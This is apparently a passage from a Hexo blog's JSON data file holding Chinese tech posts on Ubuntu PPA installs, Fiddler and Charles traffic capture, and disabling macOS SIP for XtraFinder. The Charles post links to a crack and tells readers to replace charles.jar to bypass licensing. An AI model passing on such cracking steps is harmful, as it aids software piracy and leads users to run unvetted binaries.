class=\"headerlink\" title=\"6. winusb\"></a>6. winusb</h3><p>安装命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo add-apt-repository ppa:colingille/freshlight</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install winusb</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<a href=\"http://wiki.deepin.org/index.php?title=WinUSB\">WinUSB</a></p>\n<h3 id=\"7-kwplayer\"><a href=\"#7-kwplayer\" class=\"headerlink\" title=\"7. kwplayer\"></a>7. kwplayer</h3><p>需要下载 python3-xlib_xx.deb, python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.<br>先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.<br>当然, 也可以在终端里安装, 比如:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo dpkg -i kwplayer_xx.deb</div><div class=\"line\">sudo apt-get -f install</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<br><a href=\"https://github.com/LiuLang/kwplayer\">https://github.com/LiuLang/kwplayer</a><br><a href=\"https://github.com/LiuLang/kwplayer-packages\">https://github.com/LiuLang/kwplayer-packages</a></p>\n<h3 id=\"8-Folder-Color\"><a href=\"#8-Folder-Color\" class=\"headerlink\" title=\"8. Folder Color\"></a>8. Folder Color</h3><p>该软件已经集成到Ubuntu 15.04默认库中。<br>ubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。</p>\n<p>安装命令如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo add-apt-repository ppa:costales/folder-color</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install folder-color</div><div class=\"line\">nautilus -q</div></pre></td></tr></table></figure></p>\n<p><strong>参考</strong>：<a href=\"http://imcn.me/html/y2015/23176.html\">Folder Color 已添加到 Ubuntu 15.04 默认库中</a></p>\n<h3 id=\"ubuntu截图默认保存位置\"><a href=\"#ubuntu截图默认保存位置\" class=\"headerlink\" title=\"ubuntu截图默认保存位置\"></a>ubuntu截图默认保存位置</h3><p><strong>参考</strong>：<a href=\"http://askubuntu.com/a/134469\">Default save directory for gnome-screenshot?</a></p>"},{"title":"借助fiddler抓包","date":"2015-12-29T05:58:00.000Z","_content":"\n要说起抓包工具，当算顶顶大名的fiddler。\n只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。\n\n为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。\n\n\n## 设置fiddler代理\n\n进入fiddler options，点击Connections选项卡。\n勾选 **Allow remote computers to connect**，并设置 fiddler listens on port值为8080。\n如图所示：\n![fiddler代理设置](http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png)\n\n\n## ubuntu使用fiddler代理\n打开ubuntu的网络设置，网络代理处添加HTTP代理。\n\n如图所示：\n![ubuntu使用fiddler代理](http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu使用fiddler代理.png)\n\n\n## 补充说明:虚拟机网络连接\n\n如果使用虚拟机里的fiddler，则需要注意网络的连接方式为\"桥接网卡\"方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。\n\n其实，只要主机能通过虚拟机IP ping通即可。\n\n\n\n## 参考文档\n1. [回归 Windows 下的 Fiddler](http://imququ.com/post/user-fiddler-on-macos.html#toc-4)\n2. [VirtualBox虚拟机网络连接设置的四种方式](http://pengranxiang.iteye.com/blog/715829)","source":"_posts/article/linux/借助fiddler抓包.md","raw":"categories:\n  - 工具软件\ntags:\n  - ubuntu\n  - fiddler\ntitle: 借助fiddler抓包\ndate: 2015-12-29 13:58:00\n---\n\n要说起抓包工具，当算顶顶大名的fiddler。\n只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。\n\n为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。\n\n\n## 设置fiddler代理\n\n进入fiddler options，点击Connections选项卡。\n勾选 **Allow remote computers to connect**，并设置 fiddler listens on port值为8080。\n如图所示：\n![fiddler代理设置](http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png)\n\n\n## ubuntu使用fiddler代理\n打开ubuntu的网络设置，网络代理处添加HTTP代理。\n\n如图所示：\n![ubuntu使用fiddler代理](http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu使用fiddler代理.png)\n\n\n## 补充说明:虚拟机网络连接\n\n如果使用虚拟机里的fiddler，则需要注意网络的连接方式为\"桥接网卡\"方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。\n\n其实，只要主机能通过虚拟机IP ping通即可。\n\n\n\n## 参考文档\n1. [回归 Windows 下的 Fiddler](http://imququ.com/post/user-fiddler-on-macos.html#toc-4)\n2. [VirtualBox虚拟机网络连接设置的四种方式](http://pengranxiang.iteye.com/blog/715829)","slug":"article/linux/借助fiddler抓包","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxt6004m5nbtamxealj1","content":"<p>要说起抓包工具，当算顶顶大名的fiddler。<br>只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。</p>\n<p>为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。</p>\n<h2 id=\"设置fiddler代理\"><a href=\"#设置fiddler代理\" class=\"headerlink\" title=\"设置fiddler代理\"></a>设置fiddler代理</h2><p>进入fiddler options，点击Connections选项卡。<br>勾选 <strong>Allow remote computers to connect</strong>，并设置 fiddler listens on port值为8080。<br>如图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png\" alt=\"fiddler代理设置\"></p>\n<h2 id=\"ubuntu使用fiddler代理\"><a href=\"#ubuntu使用fiddler代理\" class=\"headerlink\" title=\"ubuntu使用fiddler代理\"></a>ubuntu使用fiddler代理</h2><p>打开ubuntu的网络设置，网络代理处添加HTTP代理。</p>\n<p>如图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu使用fiddler代理.png\" alt=\"ubuntu使用fiddler代理\"></p>\n<h2 id=\"补充说明-虚拟机网络连接\"><a href=\"#补充说明-虚拟机网络连接\" class=\"headerlink\" title=\"补充说明:虚拟机网络连接\"></a>补充说明:虚拟机网络连接</h2><p>如果使用虚拟机里的fiddler，则需要注意网络的连接方式为”桥接网卡”方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。</p>\n<p>其实，只要主机能通过虚拟机IP ping通即可。</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://imququ.com/post/user-fiddler-on-macos.html#toc-4\" target=\"_blank\" rel=\"external\">回归 Windows 下的 Fiddler</a></li>\n<li><a href=\"http://pengranxiang.iteye.com/blog/715829\" target=\"_blank\" rel=\"external\">VirtualBox虚拟机网络连接设置的四种方式</a></li>\n</ol>\n","excerpt":"","more":"<p>要说起抓包工具，当算顶顶大名的fiddler。<br>只是fiddler程序依赖net framework，而非跨平台工具，只能在window环境下进行抓包。</p>\n<p>为了完成ubuntu的浏览行为被window下的fiddler抓包，可以借助虚拟机，里面安装window系统，并安装fiddler，然后开启fiddler的代理功能。</p>\n<h2 id=\"设置fiddler代理\"><a href=\"#设置fiddler代理\" class=\"headerlink\" title=\"设置fiddler代理\"></a>设置fiddler代理</h2><p>进入fiddler options，点击Connections选项卡。<br>勾选 <strong>Allow remote computers to connect</strong>，并设置 fiddler listens on port值为8080。<br>如图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/fiddler%20proxy%20settings.png\" alt=\"fiddler代理设置\"></p>\n<h2 id=\"ubuntu使用fiddler代理\"><a href=\"#ubuntu使用fiddler代理\" class=\"headerlink\" title=\"ubuntu使用fiddler代理\"></a>ubuntu使用fiddler代理</h2><p>打开ubuntu的网络设置，网络代理处添加HTTP代理。</p>\n<p>如图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/ubuntu使用fiddler代理.png\" alt=\"ubuntu使用fiddler代理\"></p>\n<h2 id=\"补充说明-虚拟机网络连接\"><a href=\"#补充说明-虚拟机网络连接\" class=\"headerlink\" title=\"补充说明:虚拟机网络连接\"></a>补充说明:虚拟机网络连接</h2><p>如果使用虚拟机里的fiddler，则需要注意网络的连接方式为”桥接网卡”方式，这样虚拟机里的系统能分配到一个IP地址，主机能通过这个IP地址及对应的端口访问到fiddler开启的代理。</p>\n<p>其实，只要主机能通过虚拟机IP ping通即可。</p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ol>\n<li><a href=\"http://imququ.com/post/user-fiddler-on-macos.html#toc-4\">回归 Windows 下的 Fiddler</a></li>\n<li><a href=\"http://pengranxiang.iteye.com/blog/715829\">VirtualBox虚拟机网络连接设置的四种方式</a></li>\n</ol>\n"},{"title":"Charles使用手记","date":"2016-02-14T10:55:00.000Z","_content":"\n<img src=\"/asserts/images/logo/charles.png\" class=\"img-logo img-center\" />\n\n\n## 一、 安装&破解\n官方网站下载原版：https://www.charlesproxy.com/latest-release/download.do\n\n破解文件下载：[charles 3.11 mac版 注册码&破解](http://www.typechodev.com/index.php/archives/518/)\n适用于Charles3.11.x，含Windows版和Mac版。\n使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。\n\n\n## 二、设置Wifi热点\n1. 在“系统偏好设置”中找到共享，并打开，如下图所示：\n![共享](/asserts/images/article/charles使用手记/234626efeiiiee0ie0de1d.png)\n\n2. 设置wifi\n![设置wifi](/asserts/images/article/charles使用手记/234626dfzl5ddirvab0wlf.png)\n\n3. 设置互联网共享\n![互联网共享](/asserts/images/article/charles使用手记/234626zltkgqegkdk9egk9.png)\n\n参见：[将你的Mac设置为共享的Wifi热点](http://www.macx.cn/thread-2076838-1-1.html)\n\n\n<!-- more -->\n\n\n## 三、代理手机\n1. 查看代理ip地址\n当前IP地址为192.168.155.43，如下图所示：\n![代理ip](/asserts/images/article/charles使用手记/charles-proxy-local-ip.png)\n\n2. 打开charles http代理端口\n打开charles http代理端口，默认端口为8888.\n![打开charles http代理端口](/asserts/images/article/charles使用手记/charles-proxy-http-setting.png)\n\n3. 手机代理配置\n![手机代理配置](/asserts/images/article/charles使用手记/charles-proxy-phone.jpg)\n\n4. 允许手机访问\n![允许手机访问](/asserts/images/article/charles使用手记/charles-proxy-trust-dialog.png)\n\n\n## 四、抓包\n打开抓包开关：\n![开始http抓包](/asserts/images/article/charles使用手记/charles-proxy-http-switch.png)\n\n![charles抓取界面](/asserts/images/article/charles使用手记/1009004.jpg)\n\n抓取界面如下图所示：\n![数据捕获](/asserts/images/article/charles使用手记/20141130195559531.png)\n\n\n## 五、注意事项\n1. unicode编码\n抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\\u65e0\\u5e26\\u88d9\\u7684\\u9ad8\\u96c5\\u88c5\\u626e，需要自行解码。\n\n2. ssl支持\ncharles对https协议的支持还需要特殊配置一下。\n需要到官方网站[LEGACY SSL PROXYING页面](http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/)下载ssl证书，charles应用以及手机上也需要做一些配置。\n如有需要可参考参考文档里的文章进行配置，本文不做介绍。\n\n\n## 六、参考文档\n1. [iOS开发工具——网络封包分析工具Charles](http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles)\n2. [charles使用教程指南](http://drops.wooyun.org/tips/2423)\n3. [Mac上的抓包工具Charles](http://blog.csdn.net/jiangwei0910410003/article/details/41620363)\n4. [Charles Web Debugging Proxy Hacking](http://www.gfzj.us/tech/2015/06/24/charles-hacking.html)\n","source":"_posts/article/mac/Charles使用手记.md","raw":"title: Charles使用手记\ntags:\n  - charles\n  - mac\ncategories:\n  - 工具软件\ndate: 2016-02-14 18:55:00\n---\n\n<img src=\"/asserts/images/logo/charles.png\" class=\"img-logo img-center\" />\n\n\n## 一、 安装&破解\n官方网站下载原版：https://www.charlesproxy.com/latest-release/download.do\n\n破解文件下载：[charles 3.11 mac版 注册码&破解](http://www.typechodev.com/index.php/archives/518/)\n适用于Charles3.11.x，含Windows版和Mac版。\n使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。\n\n\n## 二、设置Wifi热点\n1. 在“系统偏好设置”中找到共享，并打开，如下图所示：\n![共享](/asserts/images/article/charles使用手记/234626efeiiiee0ie0de1d.png)\n\n2. 设置wifi\n![设置wifi](/asserts/images/article/charles使用手记/234626dfzl5ddirvab0wlf.png)\n\n3. 设置互联网共享\n![互联网共享](/asserts/images/article/charles使用手记/234626zltkgqegkdk9egk9.png)\n\n参见：[将你的Mac设置为共享的Wifi热点](http://www.macx.cn/thread-2076838-1-1.html)\n\n\n<!-- more -->\n\n\n## 三、代理手机\n1. 查看代理ip地址\n当前IP地址为192.168.155.43，如下图所示：\n![代理ip](/asserts/images/article/charles使用手记/charles-proxy-local-ip.png)\n\n2. 打开charles http代理端口\n打开charles http代理端口，默认端口为8888.\n![打开charles http代理端口](/asserts/images/article/charles使用手记/charles-proxy-http-setting.png)\n\n3. 手机代理配置\n![手机代理配置](/asserts/images/article/charles使用手记/charles-proxy-phone.jpg)\n\n4. 允许手机访问\n![允许手机访问](/asserts/images/article/charles使用手记/charles-proxy-trust-dialog.png)\n\n\n## 四、抓包\n打开抓包开关：\n![开始http抓包](/asserts/images/article/charles使用手记/charles-proxy-http-switch.png)\n\n![charles抓取界面](/asserts/images/article/charles使用手记/1009004.jpg)\n\n抓取界面如下图所示：\n![数据捕获](/asserts/images/article/charles使用手记/20141130195559531.png)\n\n\n## 五、注意事项\n1. unicode编码\n抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\\u65e0\\u5e26\\u88d9\\u7684\\u9ad8\\u96c5\\u88c5\\u626e，需要自行解码。\n\n2. ssl支持\ncharles对https协议的支持还需要特殊配置一下。\n需要到官方网站[LEGACY SSL PROXYING页面](http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/)下载ssl证书，charles应用以及手机上也需要做一些配置。\n如有需要可参考参考文档里的文章进行配置，本文不做介绍。\n\n\n## 六、参考文档\n1. [iOS开发工具——网络封包分析工具Charles](http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles)\n2. [charles使用教程指南](http://drops.wooyun.org/tips/2423)\n3. [Mac上的抓包工具Charles](http://blog.csdn.net/jiangwei0910410003/article/details/41620363)\n4. [Charles Web Debugging Proxy Hacking](http://www.gfzj.us/tech/2015/06/24/charles-hacking.html)\n","slug":"article/mac/Charles使用手记","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxt8004p5nbtz6yb02vl","content":"<p><img src=\"/asserts/images/logo/charles.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、-安装-amp-破解\"><a href=\"#一、-安装-amp-破解\" class=\"headerlink\" title=\"一、 安装&amp;破解\"></a>一、 安装&amp;破解</h2><p>官方网站下载原版：<a href=\"https://www.charlesproxy.com/latest-release/download.do\" target=\"_blank\" rel=\"external\">https://www.charlesproxy.com/latest-release/download.do</a></p>\n<p>破解文件下载：<a href=\"http://www.typechodev.com/index.php/archives/518/\" target=\"_blank\" rel=\"external\">charles 3.11 mac版 注册码&amp;破解</a><br>适用于Charles3.11.x，含Windows版和Mac版。<br>使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。</p>\n<h2 id=\"二、设置Wifi热点\"><a href=\"#二、设置Wifi热点\" class=\"headerlink\" title=\"二、设置Wifi热点\"></a>二、设置Wifi热点</h2><ol>\n<li><p>在“系统偏好设置”中找到共享，并打开，如下图所示：<br><img src=\"/asserts/images/article/charles使用手记/234626efeiiiee0ie0de1d.png\" alt=\"共享\"></p>\n</li>\n<li><p>设置wifi<br><img src=\"/asserts/images/article/charles使用手记/234626dfzl5ddirvab0wlf.png\" alt=\"设置wifi\"></p>\n</li>\n<li><p>设置互联网共享<br><img src=\"/asserts/images/article/charles使用手记/234626zltkgqegkdk9egk9.png\" alt=\"互联网共享\"></p>\n</li>\n</ol>\n<p>参见：<a href=\"http://www.macx.cn/thread-2076838-1-1.html\" target=\"_blank\" rel=\"external\">将你的Mac设置为共享的Wifi热点</a></p>\n<a id=\"more\"></a>\n<h2 id=\"三、代理手机\"><a href=\"#三、代理手机\" class=\"headerlink\" title=\"三、代理手机\"></a>三、代理手机</h2><ol>\n<li><p>查看代理ip地址<br>当前IP地址为192.168.155.43，如下图所示：<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-local-ip.png\" alt=\"代理ip\"></p>\n</li>\n<li><p>打开charles http代理端口<br>打开charles http代理端口，默认端口为8888.<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-http-setting.png\" alt=\"打开charles http代理端口\"></p>\n</li>\n<li><p>手机代理配置<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-phone.jpg\" alt=\"手机代理配置\"></p>\n</li>\n<li><p>允许手机访问<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-trust-dialog.png\" alt=\"允许手机访问\"></p>\n</li>\n</ol>\n<h2 id=\"四、抓包\"><a href=\"#四、抓包\" class=\"headerlink\" title=\"四、抓包\"></a>四、抓包</h2><p>打开抓包开关：<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-http-switch.png\" alt=\"开始http抓包\"></p>\n<p><img src=\"/asserts/images/article/charles使用手记/1009004.jpg\" alt=\"charles抓取界面\"></p>\n<p>抓取界面如下图所示：<br><img src=\"/asserts/images/article/charles使用手记/20141130195559531.png\" alt=\"数据捕获\"></p>\n<h2 id=\"五、注意事项\"><a href=\"#五、注意事项\" class=\"headerlink\" title=\"五、注意事项\"></a>五、注意事项</h2><ol>\n<li><p>unicode编码<br>抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\\u65e0\\u5e26\\u88d9\\u7684\\u9ad8\\u96c5\\u88c5\\u626e，需要自行解码。</p>\n</li>\n<li><p>ssl支持<br>charles对https协议的支持还需要特殊配置一下。<br>需要到官方网站<a href=\"http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/\" target=\"_blank\" rel=\"external\">LEGACY SSL PROXYING页面</a>下载ssl证书，charles应用以及手机上也需要做一些配置。<br>如有需要可参考参考文档里的文章进行配置，本文不做介绍。</p>\n</li>\n</ol>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ol>\n<li><a href=\"http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles\" target=\"_blank\" rel=\"external\">iOS开发工具——网络封包分析工具Charles</a></li>\n<li><a href=\"http://drops.wooyun.org/tips/2423\" target=\"_blank\" rel=\"external\">charles使用教程指南</a></li>\n<li><a href=\"http://blog.csdn.net/jiangwei0910410003/article/details/41620363\" target=\"_blank\" rel=\"external\">Mac上的抓包工具Charles</a></li>\n<li><a href=\"http://www.gfzj.us/tech/2015/06/24/charles-hacking.html\" target=\"_blank\" rel=\"external\">Charles Web Debugging Proxy Hacking</a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/charles.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、-安装-amp-破解\"><a href=\"#一、-安装-amp-破解\" class=\"headerlink\" title=\"一、 安装&amp;破解\"></a>一、 安装&amp;破解</h2><p>官方网站下载原版：<a href=\"https://www.charlesproxy.com/latest-release/download.do\">https://www.charlesproxy.com/latest-release/download.do</a></p>\n<p>破解文件下载：<a href=\"http://www.typechodev.com/index.php/archives/518/\">charles 3.11 mac版 注册码&amp;破解</a><br>适用于Charles3.11.x，含Windows版和Mac版。<br>使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。</p>\n<h2 id=\"二、设置Wifi热点\"><a href=\"#二、设置Wifi热点\" class=\"headerlink\" title=\"二、设置Wifi热点\"></a>二、设置Wifi热点</h2><ol>\n<li><p>在“系统偏好设置”中找到共享，并打开，如下图所示：<br><img src=\"/asserts/images/article/charles使用手记/234626efeiiiee0ie0de1d.png\" alt=\"共享\"></p>\n</li>\n<li><p>设置wifi<br><img src=\"/asserts/images/article/charles使用手记/234626dfzl5ddirvab0wlf.png\" alt=\"设置wifi\"></p>\n</li>\n<li><p>设置互联网共享<br><img src=\"/asserts/images/article/charles使用手记/234626zltkgqegkdk9egk9.png\" alt=\"互联网共享\"></p>\n</li>\n</ol>\n<p>参见：<a href=\"http://www.macx.cn/thread-2076838-1-1.html\">将你的Mac设置为共享的Wifi热点</a></p>","more":"<h2 id=\"三、代理手机\"><a href=\"#三、代理手机\" class=\"headerlink\" title=\"三、代理手机\"></a>三、代理手机</h2><ol>\n<li><p>查看代理ip地址<br>当前IP地址为192.168.155.43，如下图所示：<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-local-ip.png\" alt=\"代理ip\"></p>\n</li>\n<li><p>打开charles http代理端口<br>打开charles http代理端口，默认端口为8888.<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-http-setting.png\" alt=\"打开charles http代理端口\"></p>\n</li>\n<li><p>手机代理配置<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-phone.jpg\" alt=\"手机代理配置\"></p>\n</li>\n<li><p>允许手机访问<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-trust-dialog.png\" alt=\"允许手机访问\"></p>\n</li>\n</ol>\n<h2 id=\"四、抓包\"><a href=\"#四、抓包\" class=\"headerlink\" title=\"四、抓包\"></a>四、抓包</h2><p>打开抓包开关：<br><img src=\"/asserts/images/article/charles使用手记/charles-proxy-http-switch.png\" alt=\"开始http抓包\"></p>\n<p><img src=\"/asserts/images/article/charles使用手记/1009004.jpg\" alt=\"charles抓取界面\"></p>\n<p>抓取界面如下图所示：<br><img src=\"/asserts/images/article/charles使用手记/20141130195559531.png\" alt=\"数据捕获\"></p>\n<h2 id=\"五、注意事项\"><a href=\"#五、注意事项\" class=\"headerlink\" title=\"五、注意事项\"></a>五、注意事项</h2><ol>\n<li><p>unicode编码<br>抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\\u65e0\\u5e26\\u88d9\\u7684\\u9ad8\\u96c5\\u88c5\\u626e，需要自行解码。</p>\n</li>\n<li><p>ssl支持<br>charles对https协议的支持还需要特殊配置一下。<br>需要到官方网站<a href=\"http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/\">LEGACY SSL PROXYING页面</a>下载ssl证书，charles应用以及手机上也需要做一些配置。<br>如有需要可参考参考文档里的文章进行配置，本文不做介绍。</p>\n</li>\n</ol>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ol>\n<li><a href=\"http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles\">iOS开发工具——网络封包分析工具Charles</a></li>\n<li><a href=\"http://drops.wooyun.org/tips/2423\">charles使用教程指南</a></li>\n<li><a href=\"http://blog.csdn.net/jiangwei0910410003/article/details/41620363\">Mac上的抓包工具Charles</a></li>\n<li><a href=\"http://www.gfzj.us/tech/2015/06/24/charles-hacking.html\">Charles Web Debugging Proxy Hacking</a></li>\n</ol>"},{"title":"XtraFinder in 10.11","date":"2016-07-18T06:23:00.000Z","_content":"<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n## 一、背景\nMAC系统升级到10.11后，系统提示XtraFinder不可用。\n\n\n\n## 二、解决方案\nXtraFinder需要注入自己的代码到系统Finder处理过程。\n而由于MAC 10.11开始系统默认加入了 SIP(System Integrity Protection) 机制，\n\n### 1. 关闭SIP\n重启mac，在开机启动画面长按Command + R，进入恢复模式。\n在顶部实用工具菜单，打开Terminal。\n输入：`csrutil enable --without debug`，即可。\n\n### 2. 恢复SIP\n进入恢复模式，打开Terminal。\n输入：`csrutil clear`，即可。\n\n\n## 三、参考文档\n - [XtraFinder System Integrity Protection](https://www.trankynam.com/xtrafinder/sip.html)\n - [XtraFinder not working on OSX 10.11 El Capitan](https://www.igorkromin.net/index.php/2015/10/06/xtrafinder-not-working-on-osx-1011-el-capitan/)\n - [XtraFinder在 Mac OS 10.11上使用问题](http://www.jianshu.com/p/a47e96645d88)","source":"_posts/article/mac/XtraFinder in 10.11.md","raw":"title: XtraFinder in 10.11\ntags:\n  - mac\n  - xtrafinder\ncategories:\n  - 工具软件\ndate: 2016-07-18 14:23:00\n---\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n## 一、背景\nMAC系统升级到10.11后，系统提示XtraFinder不可用。\n\n\n\n## 二、解决方案\nXtraFinder需要注入自己的代码到系统Finder处理过程。\n而由于MAC 10.11开始系统默认加入了 SIP(System Integrity Protection) 机制，\n\n### 1. 关闭SIP\n重启mac，在开机启动画面长按Command + R，进入恢复模式。\n在顶部实用工具菜单，打开Terminal。\n输入：`csrutil enable --without debug`，即可。\n\n### 2. 恢复SIP\n进入恢复模式，打开Terminal。\n输入：`csrutil clear`，即可。\n\n\n## 三、参考文档\n - [XtraFinder System Integrity Protection](https://www.trankynam.com/xtrafinder/sip.html)\n - [XtraFinder not working on OSX 10.11 El Capitan](https://www.igorkromin.net/index.php/2015/10/06/xtrafinder-not-working-on-osx-1011-el-capitan/)\n - [XtraFinder在 Mac OS 10.11上使用问题](http://www.jianshu.com/p/a47e96645d88)","slug":"article/mac/XtraFinder in 10.11","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxt9004s5nbt59nsjv2k","content":"<p><img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>MAC系统升级到10.11后，系统提示XtraFinder不可用。</p>\n<h2 id=\"二、解决方案\"><a href=\"#二、解决方案\" class=\"headerlink\" title=\"二、解决方案\"></a>二、解决方案</h2><p>XtraFinder需要注入自己的代码到系统Finder处理过程。<br>而由于MAC 10.11开始系统默认加入了 SIP(System Integrity Protection) 机制，</p>\n<h3 id=\"1-关闭SIP\"><a href=\"#1-关闭SIP\" class=\"headerlink\" title=\"1. 关闭SIP\"></a>1. 关闭SIP</h3><p>重启mac，在开机启动画面长按Command + R，进入恢复模式。<br>在顶部实用工具菜单，打开Terminal。<br>输入：<code>csrutil enable --without debug</code>，即可。</p>\n<h3 id=\"2-恢复SIP\"><a href=\"#2-恢复SIP\" class=\"headerlink\" title=\"2. 恢复SIP\"></a>2. 恢复SIP</h3><p>进入恢复模式，打开Terminal。<br>输入：<code>csrutil clear</code>，即可。</p>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><ul>\n<li><a href=\"https://www.trankynam.com/xtrafinder/sip.html\" target=\"_blank\" rel=\"external\">XtraFinder System Integrity Protection</a></li>\n<li><a href=\"https://www.igorkromin.net/index.php/2015/10/06/xtrafinder-not-working-on-osx-1011-el-capitan/\" target=\"_blank\" rel=\"external\">XtraFinder not working on OSX 10.11 El Capitan</a></li>\n<li><a href=\"http://www.jianshu.com/p/a47e96645d88\" target=\"_blank\" rel=\"external\">XtraFinder在 Mac OS 10.11上使用问题</a></li>\n</ul>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>MAC系统升级到10.11后，系统提示XtraFinder不可用。</p>\n<h2 id=\"二、解决方案\"><a href=\"#二、解决方案\" class=\"headerlink\" title=\"二、解决方案\"></a>二、解决方案</h2><p>XtraFinder需要注入自己的代码到系统Finder处理过程。<br>而由于MAC 10.11开始系统默认加入了 SIP(System Integrity Protection) 机制，</p>\n<h3 id=\"1-关闭SIP\"><a href=\"#1-关闭SIP\" class=\"headerlink\" title=\"1. 关闭SIP\"></a>1. 关闭SIP</h3><p>重启mac，在开机启动画面长按Command + R，进入恢复模式。<br>在顶部实用工具菜单，打开Terminal。<br>输入：<code>csrutil enable --without debug</code>，即可。</p>\n<h3 id=\"2-恢复SIP\"><a href=\"#2-恢复SIP\" class=\"headerlink\" title=\"2. 恢复SIP\"></a>2. 恢复SIP</h3><p>进入恢复模式，打开Terminal。<br>输入：<code>csrutil clear</code>，即可。</p>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><ul>\n<li><a href=\"https://www.trankynam.com/xtrafinder/sip.html\">XtraFinder System Integrity Protection</a></li>\n<li><a href=\"https://www.igorkromin.net/index.php/2015/10/06/xtrafinder-not-working-on-osx-1011-el-capitan/\">XtraFinder not working on OSX 10.11 El Capitan</a></li>\n<li><a 